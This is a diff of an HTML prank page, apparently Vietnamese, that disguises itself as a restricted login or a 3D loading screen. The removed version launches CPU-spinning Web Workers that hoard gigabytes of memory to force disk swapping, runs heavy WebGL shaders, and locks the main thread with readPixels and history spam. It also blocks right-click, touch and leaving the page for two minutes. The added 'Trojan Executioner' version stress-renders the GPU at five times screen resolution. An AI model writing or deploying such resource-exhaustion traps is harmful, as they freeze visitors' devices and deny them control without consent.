@@ -2,314 +2,211 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Authorization</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <title>ADev Vĩ - Trojan Executioner v2.0</title>
     <style>
-        body { margin: 0; background: #020104; overflow: hidden; font-family: 'Rajdhani', sans-serif; user-select: none; color: white; touch-action: none; overscroll-behavior: none;}
+        body { margin: 0; background: #000; overflow: hidden; font-family: monospace; }
+        canvas { width: 100vw; height: 100vh; display: block; }
+        #ui { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; pointer-events: none; z-index: 10; width: 100%; }
+        #fps-box { position: absolute; top: 15px; left: 15px; color: #00ff00; font-size: 28px; font-weight: bold; text-shadow: 2px 2px 5px #000; z-index: 10; }
         
-        /* ---------------- HỆ THỐNG HẠT BỤI NEON CỦA BẠN (GIỮ NGUYÊN 100%) ---------------- */
-        #particles-container { position: fixed; inset: 0; z-index: 1; pointer-events: none; overflow: hidden; }
-        .particle {
-            position: absolute; background: #00ffff; border-radius: 50%; opacity: 0;
-            will-change: transform, opacity, box-shadow; 
-        }
-        @keyframes floatParticle {
-            0% { transform: translateY(0) translateX(0) scale(0.2); opacity: 0; }
-            15% { opacity: 1; scale: 1; }
-            85% { opacity: 1; scale: 1; }
-            100% { transform: translateY(var(--ty)) translateX(var(--tx)) scale(0.2); opacity: 0; }
-        }
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 5px #00ffff, 0 0 10px #9632ff; }
-            100% { box-shadow: 0 0 15px #00ffff, 0 0 30px #9632ff; }
-        }
-
-        /* ---------------- MÀN HÌNH ĐĂNG NHẬP ---------------- */
-        #login-screen {
-            position: fixed; inset: 0; display: flex; justify-content: center; align-items: center;
-            background: radial-gradient(circle at 50% 50%, #150a21 0%, #020104 100%);
-            z-index: 100; transition: opacity 1s ease;
-        }
-        .glass-box {
-            position: relative; z-index: 2;
-            background: rgba(20, 15, 35, 0.45); backdrop-filter: blur(15px);
-            border: 1px solid rgba(150, 50, 255, 0.3); border-radius: 20px;
-            padding: 50px 70px; box-shadow: 0 15px 35px rgba(0,0,0,0.6), inset 0 0 20px rgba(150, 50, 255, 0.1);
-            text-align: center; display: flex; flex-direction: column; gap: 30px;
-            transition: transform 0.3s ease;
-        }
-        .title-text { font-family: 'Orbitron', sans-serif; font-size: 32px; font-weight: 700; letter-spacing: 4px; margin: 0 0 12px 0; text-shadow: 0 0 15px #b05bff; }
-        .sub-text { color: #8a7b9d; font-size: 18px; font-weight: 500; margin: 0; letter-spacing: 2px; }
-
-        .input-wrapper { position: relative; }
-        input {
-            background: rgba(0, 0, 0, 0.6); border: 2px solid transparent; border-bottom: 2px solid #6a00ff;
-            color: #00ffff; font-size: 30px; padding: 15px 20px; text-align: center; font-family: 'Orbitron', monospace; font-weight: 700;
-            border-radius: 8px; outline: none; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            letter-spacing: 6px; width: 280px; box-shadow: inset 0 0 10px rgba(0,0,0,0.8);
-        }
-        input:hover { transform: translateY(-3px) scale(1.03); box-shadow: 0 8px 25px rgba(0, 255, 255, 0.3), inset 0 0 15px rgba(0,255,255,0.1); border-bottom: 2px solid #00d4ff; }
-        input:focus { border-bottom: 2px solid #00ffff; box-shadow: 0 10px 30px -5px rgba(0, 255, 255, 0.5), inset 0 0 10px rgba(0,255,255,0.1); transform: translateY(-3px) scale(1.05); }
-        input::placeholder { color: rgba(0, 255, 255, 0.15); font-size: 24px; letter-spacing: 3px; transition: opacity 0.3s; }
-        input:focus::placeholder { opacity: 0; }
-
-        button {
-            background: linear-gradient(135deg, #6a00ff, #00d4ff); border: none; padding: 16px 40px; font-size: 22px; font-weight: 700; color: white;
-            border-radius: 50px; cursor: pointer; transition: all 0.3s ease; font-family: 'Orbitron', sans-serif; box-shadow: 0 5px 20px rgba(0, 212, 255, 0.3); margin-top: 5px; letter-spacing: 2px;
-        }
-        button:hover { transform: translateY(-3px) scale(1.05); box-shadow: 0 10px 30px rgba(0, 212, 255, 0.6); }
-        button:active { transform: translateY(1px) scale(0.98); }
-
-        .error-shake { animation: shakeError 0.4s ease-in-out; }
-        @keyframes shakeError { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-15px); } 40%, 80% { transform: translateX(15px); } }
-        .error-input { border-bottom-color: #ff0044 !important; color: #ff0044 !important; text-shadow: 0 0 10px #ff0044; box-shadow: 0 5px 20px rgba(255, 0, 68, 0.4) !important;}
-
-        /* ---------------- MOBILE / RESPONSIVE FIX (CHỈ LOGIN) ---------------- */
-        button { touch-action: manipulation; -webkit-tap-highlight-color: transparent; }
-        input { touch-action: manipulation; -webkit-tap-highlight-color: transparent; }
-
-        @media (max-width: 480px) {
-            .glass-box { padding: 36px 28px; gap: 22px; width: 88vw; max-width: 360px; box-sizing: border-box; }
-            .title-text { font-size: 20px; letter-spacing: 2px; }
-            .sub-text { font-size: 14px; }
-            input { font-size: 22px; padding: 14px 12px; width: 100%; max-width: 260px; letter-spacing: 8px; box-sizing: border-box; }
-            input::placeholder { font-size: 18px; }
-            button { font-size: 17px; padding: 14px 30px; width: 100%; }
-        }
-
-        @media (max-width: 360px) {
-            .glass-box { padding: 28px 18px; }
-            .title-text { font-size: 16px; }
-            input { font-size: 18px; letter-spacing: 6px; }
-        }
-
-        @media (min-width: 481px) and (max-width: 768px) {
-            .glass-box { padding: 40px 50px; }
-            input { width: 240px; font-size: 26px; }
-        }
-
-        /* ---------------- MÀN HÌNH TRA TẤN ---------------- */
-        #troll-screen { display: none; opacity: 0; transition: opacity 1s; position: fixed; inset: 0; z-index: 200; background: #000; }
-        canvas { width: 100vw; height: 100vh; display: block; image-rendering: pixelated; }
+        #fake-loading { color: #00ffaa; font-size: 24px; text-shadow: 0 0 10px #00ffaa; }
         
-        #ui { position: absolute; top: 15px; left: 15px; text-align: left; pointer-events: none; z-index: 10; font-family: monospace; }
-        #fps-box { color: #ff0000; font-size: 45px; font-weight: bold; text-shadow: 2px 2px 10px #000; margin-bottom: 10px;}
-        .hud-text { color: #00ffff; font-size: 22px; font-weight: bold; text-shadow: 1px 1px 3px #000; background: rgba(0,0,0,0.8); padding: 8px 12px; margin-bottom: 6px; border-left: 5px solid #ff0000;}
+        #trap-msg { display: none; color: #ff0000; font-size: 50px; font-weight: bold; text-shadow: 0 0 40px #ff0000; animation: shake 0.3s infinite; }
         
-        #trap-msg { position: absolute; top: 50vh; left: 50vw; transform: translate(-50%, -50%); display: none; color: #ff0000; font-size: 45px; font-weight: bold; text-shadow: 0 0 40px #ff0000; animation: trollShake 0.1s infinite; text-align: center; width: 100%; font-family: 'Orbitron', sans-serif;}
-        @keyframes trollShake { 0%, 100% { transform: translate(-50%, -50%) translate(4px, 4px); } 50% { transform: translate(-50%, -50%) translate(-4px, -4px); } }
+        /* Hiệu ứng mới cho chữ Troll */
+        @keyframes pop {
+            0% { transform: scale(0.5); opacity: 0; }
+            80% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
 
-        /* ---------------- MÀN HÌNH TỰ HỦY ---------------- */
-        #nuke-screen { position: fixed; inset: 0; display: none; justify-content: center; align-items: center; flex-direction: column; background: #000; z-index: 999; animation: nukeFlash 1s ease-out; }
-        @keyframes nukeFlash { 0% { background: #fff; } 100% { background: #000; } }
-        .nuke-title { font-family: 'Orbitron', sans-serif; font-size: 8vw; font-weight: 900; color: #00ff00; text-shadow: 0 0 30px #00ff00, 0 0 60px #00ff00; margin: 0; animation: glitch 2s infinite; }
-        .nuke-sub { font-family: monospace; font-size: 20px; color: #00ff00; margin-top: 20px; text-align: center;}
-        @keyframes glitch { 0% { transform: translate(0) } 20% { transform: translate(-5px, 5px) } 40% { transform: translate(-5px, -5px) } 60% { transform: translate(5px, 5px) } 80% { transform: translate(5px, -5px) } 100% { transform: translate(0) } }
+        @keyframes shake {
+            0% { transform: translate(2px, 2px) rotate(0deg); }
+            10% { transform: translate(-2px, -3px) rotate(-2deg); }
+            20% { transform: translate(-4px, 0px) rotate(2deg); }
+            30% { transform: translate(4px, 3px) rotate(0deg); }
+            40% { transform: translate(2px, -2px) rotate(2deg); }
+            50% { transform: translate(-2px, 3px) rotate(-2deg); }
+            60% { transform: translate(-4px, 2px) rotate(0deg); }
+            70% { transform: translate(4px, 2px) rotate(-2deg); }
+            80% { transform: translate(-2px, -2px) rotate(2deg); }
+            90% { transform: translate(2px, 3px) rotate(0deg); }
+            100% { transform: translate(2px, -3px) rotate(-2deg); }
+        }
     </style>
 </head>
 <body>
-
-    <div id="login-screen">
-        <div id="particles-container"></div>
-        <div class="glass-box" id="glass-panel">
-            <div>
-                <h2 class="title-text">RESTRICTED AREA</h2>
-                <p class="sub-text">Enter Authorization Key</p>
-            </div>
-            <div class="input-wrapper">
-                <input type="text" id="passcode" maxlength="7" placeholder="XXXXXXX" 
-                    autocomplete="off" spellcheck="false" 
-                    autocapitalize="characters" autocorrect="off"
-                    inputmode="text"
-                    enterkeyhint="go">
-            </div>
-            <button onclick="checkPasscode()">XÁC NHẬN</button>
-        </div>
+    <div id="fps-box">FPS: 0</div>
+    <div id="ui">
+        <div id="fake-loading">Đang tải tài nguyên 3D... (Vui lòng đợi)</div>
+        <div id="trap-msg">KÍCH HOẠT ÁN TỬ!!!<br><span style="font-size: 20px; color: #ff8800;">RTX 4060 MELTDOWN IN PROGRESS</span></div>
     </div>
-
-    <div id="troll-screen">
-        <div id="ui">
-            <div id="fps-box">OS ANNIHILATION</div>
-            <div id="hud-ft" class="hud-text">MAIN THREAD: LOCKED</div>
-            <div id="hud-target" class="hud-text" style="color:#ffaa00; border-left-color:#ffaa00;">OS: CPU/GPU/RAM/DISK 100%</div>
-            <div id="hud-status" class="hud-text" style="color:#00ffaa; border-left-color:#00ffaa;">NUKE IN: 120s</div>
-        </div>
-        <div id="trap-msg">FATAL ERROR<br><span style="font-size: 30px; color: #ff8800;">TOTAL HARDWARE MELTDOWN</span></div>
-        <canvas id="c"></canvas>
-    </div>
-
-    <div id="nuke-screen">
-        <h1 class="nuke-title">Troll Troll VN</h1>
-        <p class="nuke-sub">Hệ thống đã tự động làm mát.<br>Phần cứng của bạn đã sống sót!</p>
-    </div>
+    <canvas id="c"></canvas>
 
 <script>
-    // NGĂN CHẶN CẢM ỨNG & CHUỘT PHẢI
-    // Chỉ chặn touch khi đang ở troll-screen, để login hoạt động bình thường trên mobile
-    document.addEventListener('touchstart', function(e) {
-        if (document.getElementById('login-screen').style.display !== 'none') return; // Cho phép touch ở login
+    const canvas = document.getElementById("c");
+    const gl = canvas.getContext("webgl2");
+
+    // Biến lưu ID của requestAnimationFrame để sau này có thể ngắt nó
+    let animationReqId;
+    let safetyTimer;
+
+    canvas.addEventListener("webglcontextlost", (e) => {
         e.preventDefault();
-    }, { passive: false });
-    document.addEventListener('touchmove', function(e) { e.preventDefault(); }, { passive: false });
-    document.addEventListener('contextmenu', event => event.preventDefault());
+        document.getElementById("trap-msg").innerHTML = "💀 GPU ĐÃ ĐẮP CHIẾU 💀<br><small>Windows đã ngắt điện để cứu máy!</small>";
+        document.getElementById("fps-box").innerText = "SYSTEM CRASH";
+        document.getElementById("fps-box").style.color = "red";
+        clearTimeout(safetyTimer); // Hủy hẹn giờ cứu giá nếu máy tự crash trước
+    }, false);
 
-    // BẪY THOÁT TRANG
-    let isTrapped = false;
-    window.addEventListener('beforeunload', function (e) {
-        if (isTrapped) { e.preventDefault(); e.returnValue = ''; }
-    });
-
-    function createParticles() {
-        const container = document.getElementById('particles-container');
-        for (let i = 0; i < 30; i++) {
-            let p = document.createElement('div');
-            p.className = 'particle';
-            let size = Math.random() * 5 + 3; 
-            p.style.width = p.style.height = size + 'px';
-            p.style.left = Math.random() * 100 + 'vw';
-            p.style.top = (Math.random() * 100 + 50) + 'vh'; 
-            p.style.setProperty('--tx', (Math.random() * 400 - 200) + 'px'); 
-            p.style.setProperty('--ty', (Math.random() * -700 - 300) + 'px'); 
-            p.style.animation = `floatParticle ${Math.random() * 5 + 4}s ease-in-out ${Math.random() * 3}s infinite, pulseGlow ${Math.random() * 1.5 + 0.5}s alternate ${Math.random() * 3}s infinite`;
-            container.appendChild(p);
-        }
-    }
-    createParticles();
-
-    let workerSwarm = [];
-
-    function checkPasscode() {
-        const input = document.getElementById('passcode');
-        input.value = input.value.toUpperCase(); // Auto uppercase trước khi check
-        if (input.value === "Y4JKDP9") {
-            document.getElementById('passcode').style.color = "#00ff00";
-            document.getElementById('passcode').style.borderBottomColor = "#00ff00";
-            document.getElementById('passcode').style.textShadow = "0 0 15px #00ff00";
-            
-            // FULLSCREEN CHO ĐIỆN THOẠI
-            let docEl = document.documentElement;
-            if (docEl.requestFullscreen) docEl.requestFullscreen().catch(e=>{});
-
-            setTimeout(() => {
-                document.getElementById('login-screen').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('login-screen').style.display = 'none';
-                    document.getElementById('troll-screen').style.display = 'block';
-                    setTimeout(() => {
-                        document.getElementById('troll-screen').style.opacity = '1';
-                        isTrapped = true;
-                        startRealMeltdown(); 
-                    }, 50);
-                }, 1000); 
-            }, 400);
-        } else {
-            const p = document.getElementById('glass-panel');
-            p.classList.remove("error-shake"); void p.offsetWidth; p.classList.add("error-shake");
-            document.getElementById('passcode').classList.add("error-input");
-            setTimeout(() => { document.getElementById('passcode').classList.remove("error-input"); }, 500);
-        }
-    }
-    document.getElementById('passcode').addEventListener('keypress', function (e) { if (e.key === 'Enter') checkPasscode(); });
-    // Tự động viết hoa khi gõ (hỗ trợ Android/iOS không có autocapitalize)
-    document.getElementById('passcode').addEventListener('input', function () {
-        const pos = this.selectionStart;
-        this.value = this.value.toUpperCase();
-        this.setSelectionRange(pos, pos);
-    });
-
-    // ==========================================
-    // ĐỘNG CƠ HỦY DIỆT: CPU, GPU, RAM, VÀ DISK CÙNG NỔ
-    // ==========================================
-    function startRealMeltdown() {
-        const canvas = document.getElementById("c");
-        const gl = canvas.getContext("webgl2", { antialias: false, preserveDrawingBuffer: true });
-        if (!gl) return;
-
-        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        
-        // ----------------------------------------------------
-        // 1. TÀ THUẬT WORKERS: ÉP TRÀN RAM & SWAP Ổ CỨNG
-        // ----------------------------------------------------
-        const numCores = navigator.hardwareConcurrency || 4;
-        const workerCode = `
-            let ramHog = [];
-            self.onmessage = function() { 
-                while(true) { 
-                    // Ép CPU
-                    Math.sqrt(Math.random() * Math.random()); 
-                    
-                    // Tạo dữ liệu KHÔNG THỂ NÉN (High Entropy)
-                    // Ép Windows phải ghi xuống ổ cứng (Pagefile / Swap) thay vì nén trên CPU
-                    let chunk = new Float64Array(1024 * 1024); // 8MB mỗi cục
-                    for(let i=0; i<chunk.length; i+=1024) {
-                        chunk[i] = Math.random(); // Phá vỡ tối ưu hóa Zero-page của Hệ điều hành
-                    }
-                    ramHog.push(chunk);
-                    
-                    // Xoay vòng giữ 1.6GB RAM rác mỗi luồng (Tổng 4 luồng = 6.4GB)
-                    if(ramHog.length > 200) ramHog.shift(); 
-                } 
-            };
+    if (gl) {
+        const vsSource = `#version 300 es
+            in vec2 position;
+            void main() { gl_Position = vec4(position, 0.0, 1.0); }
         `;
-        const blob = new Blob([workerCode], {type: 'application/javascript'});
-        const workerUrl = URL.createObjectURL(blob);
-        for(let i=0; i<numCores; i++) {
-            let w = new Worker(workerUrl);
-            w.postMessage('start');
-            workerSwarm.push(w);
-        }
 
-        // ----------------------------------------------------
-        // 2. SHADER GPU SIÊU NẶNG (Tăng vòng lặp Shader)
-        // ----------------------------------------------------
-        const vsSource = "#version 300 es\nin vec2 position;\nvoid main() { gl_Position = vec4(position, 0.0, 1.0); }\n";
-        const fsSource = "#version 300 es\n" +
-            "precision highp float;\n" +
-            "uniform float time;\n" +
-            "uniform vec2 resolution;\n" +
-            "uniform int u_iters;\n" +
-            "out vec4 fragColor;\n" +
-            "mat2 rot(float a) { return mat2(cos(a), sin(a), -sin(a), cos(a)); }\n" +
-            "float GetDist(vec3 p) {\n" +
-            "    p += sin(p.zxy * 5.0 + time * 2.0) * 0.015;\n" +
-            "    vec3 z = p;\n" +
-            "    float dr = 1.0; float r = 0.0;\n" +
-            "    for (int i = 0; i < 40; i++) { \n" +
-            "        if (i >= u_iters) break;\n" +
-            "        r = length(z);\n" +
-            "        if (r > 2.0) break;\n" +
-            "        z.xy *= rot(time * 0.05);\n" +
-            "        z.xz *= rot(time * 0.08);\n" +
-            "        float theta = acos(z.z / r) * 8.0;\n" +
-            "        float phi = atan(z.y, z.x) * 8.0;\n" +
-            "        dr = pow(r, 7.0) * 8.0 * dr + 1.0;\n" +
-            "        float zr = pow(r, 8.0);\n" +
-            "        z = zr * vec3(sin(theta)*cos(phi), sin(theta)*sin(phi), cos(theta)) + p;\n" +
-            "    }\n" +
-            "    return 0.5 * log(r) * r / dr;\n" +
-            "}\n" +
-            "void main() {\n" +
-            "    vec2 uv = (gl_FragCoord.xy - 0.5 * resolution.xy) / resolution.y;\n" +
-            "    vec3 ro = vec3(0.0, 0.0, -2.8);\n" +
-            "    float s = sin(time*0.2), c = cos(time*0.2);\n" +
-            "    ro.xz *= mat2(c, -s, s, c);\n" +
-            "    vec3 rd = normalize(vec3(uv.x, uv.y, 1.0));\n" +
-            "    rd.xz *= mat2(c, -s, s, c);\n" +
-            "    vec3 col = vec3(0.0);\n" +
-            "    float d0 = 0.0; vec3 p;\n" +
-            "    for(int i = 0; i < 500; i++) { \n" +
-            "        p = ro + rd * d0;\n" +
-            "        float dS = GetDist(p); d0 += dS;\n" +
-            "        if(d0 > 12.0 || dS < 0.001) break;\n" +
-            "    }\n" +
-            "    if(d0 < 12.0) { col = vec3(1.0, 0.1, 0.2) * (1.0 - d0/12.0); } \n" +
-            "    else { col = vec3(0.02, 0.0, 0.05); }\n" +
-            "    fragColor = vec4(pow(col, vec3(0.4545)), 1.0);\n" +
-            "}\n";
+        const fsSource = `#version 300 es
+            precision highp float;
+            uniform float time;
+            uniform vec2 resolution;
+            uniform float unleash; 
+            out vec4 fragColor;
+
+            mat2 rot(float a) { return mat2(cos(a), sin(a), -sin(a), cos(a)); }
+
+            float GetDist(vec3 p) {
+                if (unleash > 0.5) {
+                    p += sin(p.zxy * 5.0 + time * 2.0) * 0.015;
+                }
+
+                vec3 z = p;
+                float dr = 1.0;
+                float r = 0.0;
+                
+                int max_iter = (unleash > 0.5) ? 20 : 4; 
+                
+                for (int i = 0; i < 20; i++) {
+                    if (i >= max_iter) break;
+                    r = length(z);
+                    if (r > 2.0) break;
+                    
+                    if (unleash > 0.5) {
+                        z.xy *= rot(time * 0.05);
+                        z.xz *= rot(time * 0.08);
+                    }
+
+                    float theta = acos(z.z / r) * 8.0;
+                    float phi = atan(z.y, z.x) * 8.0;
+                    dr = pow(r, 7.0) * 8.0 * dr + 1.0;
+                    
+                    float zr = pow(r, 8.0);
+                    z = zr * vec3(sin(theta)*cos(phi), sin(theta)*sin(phi), cos(theta)) + p;
+                }
+                return 0.5 * log(r) * r / dr;
+            }
+
+            vec3 GetNormal(vec3 p) {
+                vec2 e = vec2(0.001, 0);
+                return normalize(vec3(
+                    GetDist(p + e.xyy) - GetDist(p - e.xyy),
+                    GetDist(p + e.yxy) - GetDist(p - e.yxy),
+                    GetDist(p + e.yyx) - GetDist(p - e.yyx)
+                ));
+            }
+
+            float CalcAO(vec3 p, vec3 n) {
+                if(unleash < 0.5) return 1.0;
+                float occ = 0.0;
+                float sca = 1.0;
+                for(int i = 0; i < 5; i++) {
+                    float h = 0.01 + 0.12 * float(i) / 4.0;
+                    float d = GetDist(p + h * n);
+                    occ += (h - d) * sca;
+                    sca *= 0.75;
+                }
+                return clamp(1.0 - 2.0 * occ, 0.0, 1.0);
+            }
+
+            float SoftShadow(vec3 ro, vec3 rd) {
+                if (unleash < 0.5) return 1.0; 
+                float res = 1.0;
+                float t = 0.02;
+                for(int i = 0; i < 60; i++) {
+                    float h = GetDist(ro + rd * t);
+                    res = min(res, 8.0 * h / t);
+                    t += clamp(h, 0.01, 0.05);
+                    if(h < 0.0001 || t > 4.0) break;
+                }
+                return clamp(res, 0.0, 1.0);
+            }
+
+            void main() {
+                vec2 uv = (gl_FragCoord.xy - 0.5 * resolution.xy) / resolution.y;
+                
+                vec3 ro = vec3(0.0, 0.0, -2.8);
+                float s = sin(time*0.2), c = cos(time*0.2);
+                ro.xz *= mat2(c, -s, s, c);
+                vec3 rd = normalize(vec3(uv.x, uv.y, 1.0));
+                rd.xz *= mat2(c, -s, s, c);
+
+                vec3 col = vec3(0.0);
+                vec3 cur_ro = ro;
+                vec3 cur_rd = rd;
+                vec3 refCol = vec3(1.0);
+
+                int bounces = (unleash > 0.5) ? 2 : 1; 
+                int steps = (unleash > 0.5) ? 400 : 80;
+
+                for(int bounce = 0; bounce < 2; bounce++) {
+                    if (bounce >= bounces) break;
+                    
+                    float d0 = 0.0;
+                    vec3 p;
+                    
+                    for(int i = 0; i < 400; i++) {
+                        if (i >= steps) break;
+                        p = cur_ro + cur_rd * d0;
+                        float dS = GetDist(p);
+                        d0 += dS;
+                        if(d0 > 12.0 || dS < 0.001) break;
+                    }
+
+                    if(d0 < 12.0) {
+                        vec3 n = GetNormal(p);
+                        vec3 l1 = normalize(vec3(2.0 * sin(time), 3.0, -2.0 * cos(time)) - p);
+                        
+                        float dif1 = max(dot(n, l1), 0.0) * SoftShadow(p, l1);
+                        vec3 matCol = vec3(0.2, 0.8, 1.0) * dif1; 
+                        
+                        if (unleash > 0.5) {
+                            vec3 l2 = normalize(vec3(-2.0, -1.0, 2.0) - p);
+                            float dif2 = max(dot(n, l2), 0.0) * SoftShadow(p, l2);
+                            float ao = CalcAO(p, n); 
+                            
+                            matCol += vec3(1.0, 0.1, 0.2) * dif2;
+                            matCol *= ao; 
+                        }
+
+                        col += refCol * matCol;
+                        refCol *= vec3(0.3, 0.4, 0.5); 
+                        cur_ro = p + n * 0.005;
+                        cur_rd = reflect(cur_rd, n);
+                    } else {
+                        col += refCol * vec3(0.02, 0.02, 0.05);
+                        break;
+                    }
+                }
+
+                col = pow(col, vec3(0.4545));
+                fragColor = vec4(col, 1.0);
+            }
+        `;
 
         function compileShader(type, source) {
-            const shader = gl.createShader(type); gl.shaderSource(shader, source); gl.compileShader(shader); return shader;
+            const shader = gl.createShader(type);
+            gl.shaderSource(shader, source);
+            gl.compileShader(shader);
+            return shader;
         }
 
         const prog = gl.createProgram();
@@ -318,89 +215,80 @@
         gl.linkProgram(prog); gl.useProgram(prog);
 
         const buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]), gl.STATIC_DRAW);
+        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, -1,1, 1,-1, 1,1]), gl.STATIC_DRAW);
         const posAttr = gl.getAttribLocation(prog, "position");
         gl.enableVertexAttribArray(posAttr); gl.vertexAttribPointer(posAttr, 2, gl.FLOAT, false, 0, 0);
 
         const timeUnif = gl.getUniformLocation(prog, "time");
         const resUnif = gl.getUniformLocation(prog, "resolution");
-        const itersUnif = gl.getUniformLocation(prog, "u_iters");
+        const unleashUnif = gl.getUniformLocation(prog, "unleash");
 
-        let warmupFrames = 0; 
-        let sessionStart = performance.now();
-        let animationFrameId;
-        const pixelBuffer = new Uint8Array(4);
-        let mainRamHog = []; 
+        let frames = 0, lastTime = performance.now();
+        const fpsEl = document.getElementById('fps-box');
+        
+        let isUnleashed = false;
+        let renderScale = 0.5; 
+        let startTime = performance.now();
 
-        document.getElementById('trap-msg').style.display = "block";
-
-        function loop() {
-            let now = performance.now();
-            let timeElapsed = now - sessionStart;
-            let timeLeft = Math.max(0, 120 - Math.floor(timeElapsed / 1000));
-            document.getElementById('hud-status').innerText = `NUKE IN: ${timeLeft}s`;
-
-            if (timeElapsed >= 120000) {
-                const loseContextExt = gl.getExtension('WEBGL_lose_context');
-                if(loseContextExt) loseContextExt.loseContext();
-                workerSwarm.forEach(w => w.terminate());
-                mainRamHog = [];
-                isTrapped = false;
-                if (document.exitFullscreen) document.exitFullscreen().catch(e=>{});
-                document.getElementById('troll-screen').style.display = 'none';
-                document.getElementById('nuke-screen').style.display = 'flex';
-                return; 
+        function render(now) {
+            if (!isUnleashed && now - startTime > 3000) {
+                isUnleashed = true;
+                renderScale = 5.0; 
+                
+                document.getElementById('fake-loading').style.display = "none";
+                document.getElementById('trap-msg').style.display = "block";
+                fpsEl.style.color = "red";
+                
+                canvas.width = window.innerWidth * renderScale;
+                canvas.height = window.innerHeight * renderScale;
             }
 
-            warmupFrames++;
-            // Chạy rất nặng ngay từ đầu cho PC, hạ xuống cho A11
-            let scale = (warmupFrames < 15) ? 0.2 : (isMobile ? 1.5 : 4.0);
-            let iters = (warmupFrames < 15) ? 1 : (isMobile ? 15 : 40);
-
-            let tw = Math.floor(window.innerWidth * scale);
-            let th = Math.floor(window.innerHeight * scale);
-            if (canvas.width !== tw || canvas.height !== th) { canvas.width = tw; canvas.height = th; }
-            gl.viewport(0, 0, tw, th);
-            gl.uniform1f(timeUnif, performance.now() * 0.001);
-            gl.uniform2f(resUnif, tw, th);
-            gl.uniform1i(itersUnif, iters);
-
-            if (warmupFrames > 15) {
-                let loopStart = performance.now();
-                let lockTime = isMobile ? 3000 : 4500; // Khóa 4.5 giây để văng bảng "Không phản hồi"
-
-                // ----------------------------------------------------
-                // ĐÒN LIÊN HOÀN 4 BƯỚC (HỦY DIỆT MỌI TÀI NGUYÊN)
-                // ----------------------------------------------------
-                while (performance.now() - loopStart < lockTime) {
-                    
-                    // BƯỚC 1: VẮT GPU (ÉP GPU 100%)
-                    // Nhồi 3 lệnh vẽ nặng liên tiếp
-                    gl.drawArrays(gl.TRIANGLES, 0, 6);
-                    gl.drawArrays(gl.TRIANGLES, 0, 6);
-                    gl.drawArrays(gl.TRIANGLES, 0, 6);
-                    
-                    // BƯỚC 2: TRÓI CHÂN CPU ĐỢI GPU (Chống OS TDR)
-                    gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixelBuffer);
-                    
-                    // BƯỚC 3: ÉP TRÀN RAM & SWAP DISK NGAY TRÊN LUỒNG CHÍNH
-                    // Mảng dữ liệu High-Entropy chống nén
-                    let chunk = new Float64Array(1024 * 512); // 4MB
-                    for(let i=0; i<chunk.length; i+=512) chunk[i] = Math.random();
-                    mainRamHog.push(chunk);
-                    if(mainRamHog.length > 300) mainRamHog.shift(); // Giữ 1.2GB rác trên luồng chính
-                    
-                    // BƯỚC 4: LÀM ĐƠ LUỒNG GIAO DIỆN (UI THREAD)
-                    // Bắn liên tục lịch sử trang web, khi bấm nút X, Chrome sẽ không kịp xử lý lệnh của bạn!
-                    try { window.history.pushState(null, null, '#' + Math.random().toString().slice(2, 8)); } catch(e){}
-                }
-            } else {
-                gl.drawArrays(gl.TRIANGLES, 0, 6);
+            if (canvas.width !== window.innerWidth * renderScale || canvas.height !== window.innerHeight * renderScale) {
+                canvas.width = window.innerWidth * renderScale;
+                canvas.height = window.innerHeight * renderScale;
             }
+            gl.viewport(0, 0, canvas.width, canvas.height);
 
-            animationFrameId = requestAnimationFrame(loop);
+            gl.uniform1f(timeUnif, now * 0.001);
+            gl.uniform2f(resUnif, canvas.width, canvas.height);
+            gl.uniform1f(unleashUnif, isUnleashed ? 1.0 : 0.0);
+
+            gl.drawArrays(gl.TRIANGLES, 0, 6);
+
+            frames++;
+            if (now - lastTime >= 1000) {
+                fpsEl.innerText = "FPS: " + frames;
+                frames = 0; lastTime = now;
+            }
+            
+            // Gán lại ID để có thể hủy sau này
+            animationReqId = requestAnimationFrame(render);
         }
-        animationFrameId = requestAnimationFrame(loop);
+        
+        // Bắt đầu vòng lặp render
+        animationReqId = requestAnimationFrame(render);
+
+        // --- CƠ CHẾ AN TOÀN SAU 2 PHÚT (120,000 ms) ---
+        safetyTimer = setTimeout(() => {
+            // 1. Dừng ngay lập tức việc vẽ đồ họa 3D (Hết lag)
+            cancelAnimationFrame(animationReqId);
+            
+            // 2. Ẩn Canvas đi để màn hình về lại màu đen nhẹ nhàng
+            canvas.style.display = "none";
+            fpsEl.style.display = "none";
+            
+            // 3. Hiện dòng chữ Troll Troll VN
+            const uiContainer = document.getElementById("ui");
+            uiContainer.innerHTML = `
+                <div style="color: #00ffaa; font-size: 80px; font-weight: bold; text-shadow: 0 0 30px #00ffaa; animation: pop 0.6s ease-out;">
+                    Troll Troll VN 🤡
+                    <br>
+                    <span style="font-size: 24px; color: #fff; text-shadow: none; display: block; margin-top: 15px;">
+                        (Màn kịch kết thúc, GPU đã được tha mạng!)
+                    </span>
+                </div>
+            `;
+        }, 120000); 
     }
 </script>
 </body>
